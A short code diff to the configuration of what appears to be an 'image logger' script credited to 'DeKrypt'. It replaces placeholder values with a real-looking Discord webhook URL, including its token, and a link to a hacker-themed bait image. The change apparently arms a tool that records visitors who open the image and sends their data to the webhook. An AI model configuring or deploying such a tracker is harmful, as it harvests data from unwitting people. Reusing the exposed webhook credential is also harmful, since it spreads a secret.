@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "WEBHOOK HERE !",
-    "image": "IMAGE HERE !", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1445525808738209842/7mVz0fWYacpiQd_Yew1gXK5S39JGMSfLDsho-5D8iLhuVbncp2hnjiW-h7WBPlOIDMf9",
+    "image": "https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.xbox.com%2Far-EG%2Fgames%2Fstore%2Faaa-dynamic-scenes-anon-neon-hacker-dynamic-scene%2F9NRPN847929P&psig=AOvVaw2-emx1fi0H0_8X6LZGdyta&ust=1764797091021000&source=images&cd=vfe&opi=89978449&ved=0CBUQjRxqFwoTCKisys_rn5EDFQAAAAAdAAAAABAE", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
